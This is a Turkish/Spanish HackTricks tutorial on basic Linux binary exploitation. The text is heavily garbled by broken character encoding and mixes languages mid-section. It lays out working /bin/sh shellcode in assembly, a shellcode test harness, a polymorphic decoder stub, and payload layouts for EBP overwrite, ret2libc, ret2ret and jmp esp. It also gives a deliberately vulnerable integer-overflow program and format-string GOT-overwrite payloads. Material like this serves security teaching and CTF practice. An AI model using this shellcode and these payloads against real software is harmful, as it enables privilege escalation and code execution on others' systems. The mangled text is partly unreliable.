# Linux Exploiting (Temel) (SPA)

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR gÃ¶ndererek HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## **1.STACK OVERFLOWS**

> buffer overflow, buffer overrun, stack overrun, stack smashing

Segmentation fault or segment violation: Bir iÅŸleme atanmamÄ±ÅŸ bir bellek adresine eriÅŸilmeye Ã§alÄ±ÅŸÄ±ldÄ±ÄŸÄ±nda oluÅŸur.

Bir program iÃ§indeki bir fonksiyonun adresini elde etmek iÃ§in ÅŸunu yapabilirsiniz:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### sys\_execve Ã‡aÄŸrÄ±sÄ±

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

Kernel kesmelerini gÃ¶rÃ¼ntÃ¼le: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep â€œ\_\_NR\_â€

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(â€œ/bin/shâ€, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; eax'Ä± temizle\
xor ebx, ebx ; ebx = 0 Ã§Ã¼nkÃ¼ geÃ§irilecek bir argÃ¼man yok\
mov al, 0x01 ; eax = 1 â€”> \_\_NR\_exit 1\
int 0x80 ; Sistem Ã§aÄŸrÄ±sÄ±nÄ± Ã§alÄ±ÅŸtÄ±r

**nasm -f elf assembly.asm** â€”> Bir .o dosyasÄ± dÃ¶ndÃ¼rÃ¼r\
**ld assembly.o -o shellcodeout** â€”> DerlenmiÅŸ kod iÃ§eren yÃ¼rÃ¼tÃ¼lebilir dosyayÄ± verir ve **objdump** ile opcode'larÄ± Ã§Ä±karabiliriz\
**objdump -d -Mintel ./shellcodeout** â€”> GerÃ§ekten shellcodemuz olduÄŸunu gÃ¶rmek ve opcode'larÄ± Ã§Ä±karmak iÃ§in

**Shellcodenin Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± doÄŸrulama**
```
char shellcode[] = â€œ\x31\xc0\x31\xdb\xb0\x01\xcd\x80â€

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
Sistem Ã§aÄŸrÄ±larÄ±nÄ±n doÄŸru yapÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶rmek iÃ§in Ã¶nceki program derlenmeli ve sistem Ã§aÄŸrÄ±larÄ± **strace ./DERLENMÄ°Å_PROGRAM** iÃ§inde gÃ¶rÃ¼nmelidir.

Shellcode'lar oluÅŸturulurken bir hile yapÄ±labilir. Ä°lk talimat bir Ã§aÄŸrÄ±ya bir sÄ±Ã§rama yapmaktÄ±r. Ã‡aÄŸrÄ±, orijinal kodu Ã§aÄŸÄ±rÄ±r ve aynÄ± zamanda EIP'yi yÄ±ÄŸÄ±na yerleÅŸtirir. Ã‡aÄŸrÄ± talimatÄ±ndan sonra ihtiyacÄ±mÄ±z olan dizeyi eklemiÅŸizdir, bu nedenle bu EIP ile dizeyi iÅŸaretleyebilir ve aynÄ± zamanda kodu devam ettirebiliriz.

Ã–RNEK **HÄ°LE (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al Ãºltimo call
popl                %esi                                       ; Guardamos en ese la direcciÃ³n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=â€œ/bin/shâ€
leal                 0x8(%esi), %ecx      ; arg[2] = {â€œ/bin/shâ€, â€œ0â€}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(â€œ/bin/shâ€, [â€œ/bin/shâ€, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruciÃ³n
.string             \â€/bin/sh\â€                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
**Stack Kullanarak EJ(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; â€œ\0â€
push               dword 0x68732f2f ; â€œ//shâ€
push               dword 0x6e69622f; â€œ/binâ€
mov                ebx, esp                     ; arg1 = â€œ/bin//sh\0â€
push               eax                             ; Null -> args[1]
push               ebx                             ; â€œ/bin/sh\0â€ -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(â€œ/bin/shâ€, args[â€œ/bin/shâ€, â€œNULLâ€], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutÃ³ fabs
â€¦
```
**Yumurta AvcÄ±sÄ±:**

Bir iÅŸleme iliÅŸkilendirilmiÅŸ bellek sayfalarÄ±nÄ± dolaÅŸarak orada saklanan shellcode'u arayan kÃ¼Ã§Ã¼k bir kod parÃ§asÄ±dÄ±r (shellcode'da yer alan bir imza arar). Kod enjekte etmek iÃ§in sadece kÃ¼Ã§Ã¼k bir alanÄ±n olduÄŸu durumlarda faydalÄ±dÄ±r.

**Polimorfik Shell KodlarÄ±**

KÃ¼Ã§Ã¼k kodlarla ÅŸifrelenmiÅŸ kabuklardÄ±r ve bunlarÄ± Ã§Ã¶zen ve onlara atlayan kÃ¼Ã§Ã¼k kodlar iÃ§erirler, Call-Pop hilesini kullanarak ÅŸifrelenmiÅŸ bir Ã¶rnek ÅŸÃ¶yle olabilir:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerÃ¡)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;AquÃ­ va el shellcode
```
1. **Frame Pointer (EBP) SaldÄ±rÄ±sÄ±**

EBP'yi deÄŸiÅŸtirebiliyor ancak EIP'yi deÄŸiÅŸtiremiyorsak kullanÄ±ÅŸlÄ±dÄ±r.

Bir fonksiyondan Ã§Ä±karken aÅŸaÄŸÄ±daki assembly kodunun Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± biliyoruz:
```
movl               %ebp, %esp
popl                %ebp
ret
```
De esta forma, si se puede modificar el EBP al salir de una funciÃ³n (fvuln) que ha sido llamada por otra funciÃ³n, cuando la funciÃ³n que llamÃ³ a fvuln finalice, su EIP puede ser modificado.

En fvuln se puede introducir un EBP falso que apunte a un sitio donde estÃ© la direcciÃ³n de la shellcode + 4 (hay que sumarle 4 por el pop). AsÃ­, al salir de la funciÃ³n, se meterÃ¡ en ESP el valor de &(\&Shellcode)+4, con el pop se le restarÃ¡ 4 al ESP y este apuntarÃ¡ a la direcciÃ³n de la shellcode cuando se ejecute el ret.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + relleno + &(\&Shellcode)+4

**Off-by-One Exploit**\
Se permite modificar tan solo el byte menos significativo del EBP. Se puede llevar a cabo un ataque como el anterior pero la memoria que guarda la direcciÃ³n de la shellcode debe compartir los 3 primeros bytes con el EBP.

## **4. MÃ©todos return to Libc**

MÃ©todo Ãºtil cuando el stack no es ejecutable o deja un buffer muy pequeÃ±o para modificar.

El ASLR provoca que en cada ejecuciÃ³n las funciones se carguen en posiciones distintas de la memoria. Por lo tanto este mÃ©todo puede no ser efectivo en ese caso. Para servidores remotos, como el programa estÃ¡ siendo ejecutado constantemente en la misma direcciÃ³n sÃ­ puede ser Ãºtil.

* **cdecl(C declaration)** Mete los argumentos en el stack y tras salir de la funciÃ³n limpia la pila
* **stdcall(standard call)** Mete los argumentos en la pila y es la funciÃ³n llamada la que la limpia
* **fastcall** Mete los dos primeros argumentos en registros y el resto en la pila

Se pone la direcciÃ³n de la instrucciÃ³n system de libc y se le pasa como argumento el string â€œ/bin/shâ€, normalmente desde una variable de entorno. AdemÃ¡s, se usa la direcciÃ³n a la funciÃ³n exit para que una vez que no se requiera mÃ¡s la shell, salga el programa sin dar problemas (y escribir logs).

**export SHELL=/bin/sh**

Para encontrar las direcciones que necesitaremos se puede mirar dentro de **GDB:**\
**p system**\
**p exit**\
**rabin2 -i ejecutable** â€”> Da la direcciÃ³n de todas las funciones que usa el programa al cargarse\
(Dentro de un start o algun breakpoint): **x/500s $esp** â€”> Buscamos dentro de aqui el string /bin/sh

Una vez tengamos estas direcciones el **exploit** quedarÃ­a:

â€œAâ€ \* DISTANCIA EBP + 4 (EBP: pueden ser 4 "A"s aunque mejor si es el EBP real para evitar fallos de segmentaciÃ³n) + DirecciÃ³n de **system** (sobreescribirÃ¡ el EIP) + DirecciÃ³n de **exit** (al salir de system(â€œ/bin/shâ€) se llamarÃ¡ a esta funciÃ³n pues los primero 4bytes del stack son tratados como la siguiente direcciÃ³n del EIP a ejecutar) + DirecciÃ³n de â€œ**/bin/sh**â€ (serÃ¡ el parÃ¡metro pasado a system)

De esta forma el EIP se sobreescribirÃ¡ con la direcciÃ³n de system la cual recibirÃ¡ como parÃ¡metro el string â€œ/bin/shâ€ y al salir de este ejecutarÃ¡ la funciÃ³n exit().

Es posible encontrarse en la situaciÃ³n de que algÃºn byte de alguna direcciÃ³n de alguna funciÃ³n sea nulo o espacio (\x20). En ese caso se pueden desensamblar las direcciones anteriores a dicha funciÃ³n pues probablemente haya varios NOPs que nos permitan poder llamar a alguno de ellos en vez de a la funciÃ³n directamente (por ejemplo con > x/8i system-4).

Este mÃ©todo funciona pues al llamar a una funciÃ³n como system usando el opcode **ret** en vez de **call**, la funciÃ³n entiende que los primeros 4bytes serÃ¡n la direcciÃ³n **EIP** a la que volver.

Una tÃ©cnica interesante con este mÃ©todo es el llamar a **strncpy()** para mover un payload del stack al heap y posteriormente usar **gets()** para ejecutar dicho payload.

Otra tÃ©cnica interesante es el uso de **mprotect()** la cual permite asignar los permisos deseados a cualquier parte de la memoria. Sirve o servÃ­a en BDS, MacOS y OpenBSD, pero no en linux(controla que no se puedan otorgar a la vez permisos de escritura y ejecuciÃ³n). Con este ataque se podrÃ­a volver a configurar la pila como ejecutable.

**Encadenamiento de funciones**

BasÃ¡ndonos en la tÃ©cnica anterior, esta forma de exploit consiste en:\
Relleno + \&FunciÃ³n1 + \&pop;ret; + \&arg\_fun1 + \&FunciÃ³n2 + \&pop;ret; + \&arg\_fun2 + â€¦

De esta forma se pueden encadenar funciones a las que llamar. AdemÃ¡s, si se quieren usar funciones con varios argumentos, se pueden poner los argumentos necesarios (ej 4) y poner los 4 argumentos y buscar direcciÃ³n a un sitio con opcodes: pop, pop, pop, pop, ret â€”> **objdump -d ejecutable**

**Encadenamiento mediante falseo de frames (encadenamiento de EBPs)**

Consiste en aprovechar el poder manipular el EBP para ir encadenando la ejecuciÃ³n de varias funciones a travÃ©s del EBP y de "leave;ret"

RELLENO

* Situamos en el EBP un EBP falso que apunta a: 2Âº EBP\_falso + la funciÃ³n a ejecutar: (\&system() + \&leave;ret + &â€œ/bin/shâ€)
* En el EIP ponemos de direcciÃ³n una funciÃ³n &(leave;ret)

Iniciamos la shellcode con la direcciÃ³n a la siguiente parte de la shellcode, por ej: 2ÂºEBP\_falso + \&system() + &(leave;ret;) + &â€/bin/shâ€

el 2ÂºEBP serÃ­a: 3ÂºEBP\_falso + \&system() + &(leave;ret;) + &â€/bin/lsâ€

Esta shellcode se puede repetir indefinidamente en las partes de memoria a las que se tenga acceso de forma que se conseguirÃ¡ una shellcode fÃ¡cilmente divisible por pequeÃ±os trozos de memoria.

(Se encadena la ejecuciÃ³n de funciones mezclando las vulnerabilidades vistas anteriormente de EBP y de ret2lib)

## **5.MÃ©todos complementarios**

**Ret2Ret**

Ãštil para cuando no se puede meter una direcciÃ³n del stack en el EIP (se comprueba que el EIP no contenga 0xbf) o cuando no se puede calcular la ubicaciÃ³n de la shellcode. Pero, la funciÃ³n vulnerable acepte un parÃ¡metro (la shellcode irÃ¡ aquÃ­).

De esta forma, al cambiar el EIP por una direcciÃ³n a un **ret**, se cargarÃ¡ la siguiente direcciÃ³n (que es la direcciÃ³n del primer argumento de la funciÃ³n). Es decir, se cargarÃ¡ la shellcode.

El exploit quedarÃ­a: SHELLCODE + Relleno (hasta EIP) + **\&ret** (los siguientes bytes de la pila apuntan al inicio de la shellcode pues se mete en el stack la direcciÃ³n al parÃ¡metro pasado)

Al parecer funciones como **strncpy** una vez completas eliminan de la pila la direcciÃ³n donde estaba guardada la shellcode imposibilitando esta tÃ©cnica. Es decir, la direcciÃ³n que pasan a la funciÃ³n como argumento (la que guarda la shellcode) es modificada por un 0x00 por lo que al llamar al segundo **ret** se encuentra con un 0x00 y el programa muere.
```
**Ret2PopRet**
```
Si kontrolÃ¼mÃ¼z birinci argÃ¼man Ã¼zerinde yoksa ancak ikinci veya Ã¼Ã§Ã¼ncÃ¼ argÃ¼man Ã¼zerinde kontrolÃ¼mÃ¼z varsa, EIP'yi pop-ret veya pop-pop-ret adresine Ã¼zerine yazabiliriz.

**Murat TekniÄŸi**

Linux'ta tÃ¼m programlar 0xbfffffff'den baÅŸlayarak haritalanÄ±r.

Linux'ta yeni bir iÅŸlem iÃ§in yÄ±ÄŸÄ±nÄ±n nasÄ±l oluÅŸturulduÄŸunu gÃ¶z Ã¶nÃ¼nde bulundurarak, programÄ±n yalnÄ±zca shellcode'un bulunduÄŸu bir ortamda baÅŸlatÄ±lmasÄ±nÄ± saÄŸlayacak bir exploit geliÅŸtirilebilir. Bu adres ÅŸu ÅŸekilde hesaplanabilir: addr = 0xbfffffff - 4 - strlen(NOMBRE\_ejecutable\_completo) - strlen(shellcode)

Bu ÅŸekilde, shellcode'un bulunduÄŸu ortam deÄŸiÅŸkeninin adresi kolayca elde edilebilir.

Bu, execle fonksiyonunun istenilen sadece Ã§evresel deÄŸiÅŸkenleri iÃ§eren bir ortam oluÅŸturmasÄ±na izin vermesi sayesinde mÃ¼mkÃ¼ndÃ¼r.

**ESP'ye Atla: Windows TarzÄ±**

ESP'nin her zaman yÄ±ÄŸÄ±nÄ±n baÅŸlangÄ±cÄ±na iÅŸaret etmesi nedeniyle, bu teknik EIP'yi **jmp esp** veya **call esp** Ã§aÄŸrÄ±sÄ±nÄ±n adresiyle deÄŸiÅŸtirmeyi iÃ§erir. BÃ¶ylece, EIP'nin Ã¼zerine yazÄ±ldÄ±ktan sonra shellcode kaydedilir Ã§Ã¼nkÃ¼ **ret** komutunu Ã§alÄ±ÅŸtÄ±rdÄ±ktan sonra ESP, shellcode'un kaydedildiÄŸi yerde olacak ÅŸekilde bir sonraki adrese iÅŸaret edecektir.

Windows veya Linux'ta ASLR etkin deÄŸilse, **jmp esp** veya **call esp**'yi paylaÅŸÄ±lan bir nesnede saklanmÄ±ÅŸ olarak Ã§aÄŸÄ±rabilirsiniz. ASLR etkinse, zafiyetli programÄ±n iÃ§inde arama yapÄ±labilir.

AyrÄ±ca, shellcode'u yÄ±ÄŸÄ±nÄ±n ortasÄ±na yerleÅŸtirmek yerine EIP'nin bozulmasÄ±ndan sonra shellcode'u yerleÅŸtirebilmek, fonksiyonun ortasÄ±nda yÃ¼rÃ¼tÃ¼len push veya pop komutlarÄ±nÄ±n shellcode'a dokunmamasÄ±nÄ± saÄŸlar (bu, fonksiyon yÄ±ÄŸÄ±nÄ±nÄ±n ortasÄ±na yerleÅŸtirilirse olabilecek bir durumdur).

Benzer ÅŸekilde, bir fonksiyonun shellcode'un nerede saklandÄ±ÄŸÄ±nÄ± dÃ¶ndÃ¼rdÃ¼ÄŸÃ¼nÃ¼ biliyorsak, **call eax** veya **jmp eax (ret2eax)** Ã§aÄŸrÄ±labilir.

**TamsayÄ± TaÅŸmalarÄ±**

Bu tÃ¼r taÅŸmalar, bir deÄŸiÅŸkenin geÃ§irilen kadar bÃ¼yÃ¼k bir sayÄ±yÄ± desteklemeye hazÄ±r olmadÄ±ÄŸÄ±nda meydana gelir, muhtemelen iÅŸaretli ve iÅŸaretsiz deÄŸiÅŸkenler arasÄ±ndaki karÄ±ÅŸÄ±klÄ±ktan kaynaklanabilir, Ã¶rneÄŸin:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
Ã–nceki Ã¶rnekte programÄ±n 2 parametre beklediÄŸini gÃ¶rÃ¼yoruz. Ä°lk parametre takip eden dizenin uzunluÄŸu ve ikinci parametre dizedir.

EÄŸer ilk parametre olarak negatif bir sayÄ± verirsek, len < 256 Ã§Ä±kacaktÄ±r ve bu filtreyi geÃ§eceÄŸiz, ayrÄ±ca strlen(buffer) da l'den daha kÃ¼Ã§Ã¼k olacaktÄ±r, Ã§Ã¼nkÃ¼ l unsigned int tÃ¼rÃ¼ndedir ve Ã§ok bÃ¼yÃ¼k olacaktÄ±r.

Bu tÃ¼r taÅŸmalarda, programÄ±n iÅŸlemine bir ÅŸeyler yazmayÄ± hedeflemiyor, ancak diÄŸer zayÄ±f noktalarÄ± sÃ¶mÃ¼rmek iÃ§in kÃ¶tÃ¼ tasarlanmÄ±ÅŸ filtreleri aÅŸmayÄ± amaÃ§lÄ±yor.

**BaÅŸlatÄ±lmamÄ±ÅŸ DeÄŸiÅŸkenler**

BaÅŸlatÄ±lmamÄ±ÅŸ bir deÄŸiÅŸkenin alabileceÄŸi deÄŸeri bilinmez ve bunu gÃ¶zlemlemek ilginÃ§ olabilir. Ã–nceki iÅŸlevdeki bir deÄŸiÅŸkenin aldÄ±ÄŸÄ± deÄŸeri alabilir ve bu deÄŸiÅŸken saldÄ±rgan tarafÄ±ndan kontrol edilebilir.

## **BiÃ§im Dizileri**

C'de **`printf`** iÅŸlevi bazÄ± dizeleri **yazdÄ±rmak** iÃ§in kullanÄ±labilen bir iÅŸlevdir. Bu iÅŸlevin beklediÄŸi **ilk parametre**, **biÃ§imleyicilerle** birlikte **ham metindir**. Beklenen **takip eden parametreler**, ham metinden **biÃ§imleyicileri** **yerine koymak iÃ§in** beklenen **deÄŸerlerdir**.

ZararlÄ± bir metin, bu iÅŸlevin ilk argÃ¼manÄ± olarak kullanÄ±ldÄ±ÄŸÄ±nda zafiyet ortaya Ã§Ä±kar. SaldÄ±rgan, **printf biÃ§im dizesi yeteneklerini kÃ¶tÃ¼ye kullanarak** Ã¶zel bir giriÅŸ oluÅŸturabilir ve bu ÅŸekilde **herhangi bir veriyi herhangi bir adrese yazabilir**. Bu ÅŸekilde **keyfi kod yÃ¼rÃ¼tebilir**.

BiÃ§imleyiciler:
```bash
%08x â€”> 8 hex bytes
%d â€”> Entire
%u â€”> Unsigned
%s â€”> String
%n â€”> Number of written bytes
%hn â€”> Occupies 2 bytes instead of 4
<n>$X â€”> Direct access, Example: ("%3$d", var1, var2, var3) â€”> Access to var3
```
**`%n`** belirtilen adresin iÃ§ine yazÄ±lan byte sayÄ±sÄ±nÄ± yazar. YazÄ±lmasÄ± gereken onaltÄ±lÄ±k sayÄ± kadar byte yazarak istediÄŸiniz veriyi yazabilirsiniz.
```bash
AAAA%.6000d%4\$n â€”> Write 6004 in the address indicated by the 4Âº param
AAAA.%500\$08x â€”> Param at offset 500
```
### GOT (Global Offsets Table) / PLT (Procedure Linkage Table)

Bu, program tarafÄ±ndan kullanÄ±lan **harici fonksiyonlarÄ±n adreslerini** iÃ§eren tablodur.

Bu tablonun adresini ÅŸu komutla alÄ±n: **`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

GEF'de **yÃ¼rÃ¼tÃ¼lebilir dosyayÄ±** yÃ¼kledikten sonra **GOT'da** bulunan **fonksiyonlarÄ± gÃ¶rebilirsiniz**: `gefâ¤ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

GEF kullanarak **hata ayÄ±klama** oturumu baÅŸlatabilir ve **`got`** komutunu Ã§alÄ±ÅŸtÄ±rarak got tablosunu gÃ¶rebilirsiniz:

![](<../../.gitbook/assets/image (621).png>)

Bir ikili dosyada GOT, **fonksiyonlarÄ±n adreslerine** veya **fonksiyon adresini yÃ¼kleyecek** olan **PLT** bÃ¶lÃ¼mÃ¼ne sahiptir. Bu saldÄ±rÄ±nÄ±n amacÄ±, daha sonra **Ã§alÄ±ÅŸtÄ±rÄ±lacak bir fonksiyonun GOT giriÅŸini** **`system`** **fonksiyonunun PLT adresiyle deÄŸiÅŸtirmektir**. Ä°deal olarak, **kontrolÃ¼nÃ¼zdeki parametrelerle Ã§aÄŸrÄ±lacak bir fonksiyonun GOT'unu** **deÄŸiÅŸtireceksiniz**.

EÄŸer **`system`** **betiÄŸin iÃ§inde kullanÄ±lmÄ±yorsa**, sistem fonksiyonunun GOT'ta bir giriÅŸi **olmayacaktÄ±r**. Bu senaryoda, Ã¶ncelikle `system` fonksiyonunun adresini **sÄ±zdÄ±rmanÄ±z gerekecektir**.

**Procedure Linkage Table**, Ã§Ã¶zÃ¼m gerektiren tÃ¼m gerekli **sembolleri depolayan** ELF dosyasÄ±ndaki **salt okunur** bir tablodur. Bu fonksiyonlardan biri Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda, **GOT** **akÄ±ÅŸÄ±** **PLT'ye yÃ¶nlendirecek** ve bÃ¶ylece **fonksiyonun adresini Ã§Ã¶zebilecek ve GOT'a yazabilecektir**.\
Sonra, o adrese bir Ã§aÄŸrÄ± yapÄ±ldÄ±ÄŸÄ±nda **fonksiyon** doÄŸrudan **Ã§Ã¶zÃ¼lmeden** Ã§aÄŸrÄ±lÄ±r.

PLT adreslerini **`objdump -j .plt -d ./vuln_binary`** ile gÃ¶rebilirsiniz.

### **SaldÄ±rÄ± AkÄ±ÅŸÄ±**

Ã–nce aÃ§Ä±klandÄ±ÄŸÄ± gibi, amacÄ±mÄ±z daha sonra Ã§aÄŸrÄ±lacak bir **fonksiyonun GOT tablosundaki adresini deÄŸiÅŸtirmektir**. Ä°deali, yÃ¼rÃ¼tÃ¼lebilir bir bÃ¶lÃ¼mde bulunan bir **shellcode'un adresini ayarlamaktÄ±r**, ancak muhtemelen bir yÃ¼rÃ¼tÃ¼lebilir bÃ¶lÃ¼me bir shellcode yazamayacaksÄ±nÄ±z.\
Bu nedenle, **kullanÄ±cÄ±nÄ±n argÃ¼manlarÄ±nÄ± alan bir fonksiyonu** **Ã¼zerine yazmak** ve onu **`system`** **fonksiyonuna iÅŸaret etmek** farklÄ± bir seÃ§enektir.

Adresi yazmak iÃ§in genellikle 2 adÄ±m atÄ±lÄ±r: **Ä°lk olarak adresin 2 baytÄ±nÄ± yazarsÄ±nÄ±z** ve ardÄ±ndan diÄŸer 2'sini. Bunu yapmak iÃ§in **`$hn`** kullanÄ±lÄ±r.

**HOB**, adresin 2 yÃ¼ksek baytÄ±na **Ã§aÄŸrÄ±lÄ±r**\
**LOB**, adresin 2 dÃ¼ÅŸÃ¼k baytÄ±na **Ã§aÄŸrÄ±lÄ±r**

Bu nedenle, format dizesinin nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±ndan dolayÄ± Ã¶nce \[HOB, LOB]'den **daha kÃ¼Ã§Ã¼k olanÄ±nÄ± yazmanÄ±z** ve ardÄ±ndan diÄŸerini yazmanÄ±z gerekir.

EÄŸer HOB < LOB ise\
`[adres+2][adres]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

EÄŸer HOB > LOB ise\
`[adres+2][adres]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 NÂºParam\_dir\_HOB LOB\_shell-HOB\_shell NÂºParam\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **Format Dizesi SaldÄ±rÄ±sÄ± Åablonu**

Format dizilerini kullanarak GOT'u sÃ¶mÃ¼rmek iÃ§in bir **ÅŸablon** bulabilirsiniz:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini\_array**

Temelde, bu, programÄ±n **bitmeden Ã¶nce Ã§aÄŸrÄ±lacak** olan **fonksiyonlarÄ± iÃ§eren** bir yapÄ±dÄ±r. Bu, **sadece bir adrese atlayarak shellcode'unuzu Ã§aÄŸÄ±rabilirsiniz** veya **format dizesini ikinci kez sÃ¶mÃ¼rmek iÃ§in tekrar main'e dÃ¶nmek zorunda kaldÄ±ÄŸÄ±nÄ±z durumlarda** ilginÃ§ olabilir.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Not edin ki bu **sonsuz dÃ¶ngÃ¼** oluÅŸturmayacak Ã§Ã¼nkÃ¼ ana programa geri dÃ¶ndÃ¼ÄŸÃ¼nÃ¼zde canary fark edecek, yÄ±ÄŸÄ±nÄ±n sonu bozulmuÅŸ olabilir ve iÅŸlev tekrar Ã§aÄŸrÄ±lmayacak. Bu sayede zafiyetin **1 kez daha yÃ¼rÃ¼tÃ¼lmesine** izin verilecek.

### **Ä°Ã§eriÄŸi DÃ¶kÃ¼mlemek iÃ§in Format Dizileri**

Bir format dizesi ayrÄ±ca programÄ±n belleÄŸinden iÃ§erik **dÃ¶kmek** iÃ§in kÃ¶tÃ¼ye kullanÄ±labilir.\
Ã–rneÄŸin, aÅŸaÄŸÄ±daki durumda yÄ±ÄŸÄ±nda bir bayraÄŸa iÅŸaret eden bir **yerel deÄŸiÅŸken** var. EÄŸer **bellekte bayraÄŸa iÅŸaret eden iÅŸaretÃ§inin** nerede olduÄŸunu **bulursanÄ±z**, **printf'in** o **adrese eriÅŸmesini** saÄŸlayabilir ve **bayraÄŸÄ± yazdÄ±rabilirsiniz**:

Yani, bayrak **0xffffcf4c** adresinde

![](<../../.gitbook/assets/image (618) (2).png>)

Ve sÄ±zÄ±ntÄ±dan **bayraÄŸa iÅŸaret eden iÅŸaretÃ§inin** **8.** parametrede olduÄŸunu gÃ¶rebilirsiniz:

![](<../../.gitbook/assets/image (623).png>)

Bu nedenle, **8. parametreye eriÅŸerek** bayraÄŸÄ± alabilirsiniz:

![](<../../.gitbook/assets/image (624).png>)

**Ã–nceki zafiyeti** takip ederek ve iÃ§erik sÄ±zdÄ±rabileceÄŸinizi fark ederek **`printf`**'e **iÅŸaretÃ§ileri ayarlayabilir** ve **yÃ¼rÃ¼tÃ¼lebilir** olan bÃ¶lÃ¼me **tamamen dÃ¶kebilirsiniz**!

### **DTOR**

{% hint style="danger" %}
GÃ¼nÃ¼mÃ¼zde bir dtor bÃ¶lÃ¼mÃ¼ olan bir ikili dosya bulmak Ã§ok **garip**.
{% endhint %}

YÄ±kÄ±cÄ±lar, programÄ±n **sona ermeden Ã¶nce yÃ¼rÃ¼tÃ¼len iÅŸlevlerdir**.\
Bir **adresi** bir **shellcode'a yazmayÄ±** baÅŸarÄ±rsanÄ±z **`__DTOR_END__`** iÃ§inde, bu programÄ±n sona ermeden Ã¶nce **yÃ¼rÃ¼tÃ¼lecektir**.\
Bu bÃ¶lÃ¼mÃ¼n adresini alÄ±n:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep â€œ__DTORâ€
```
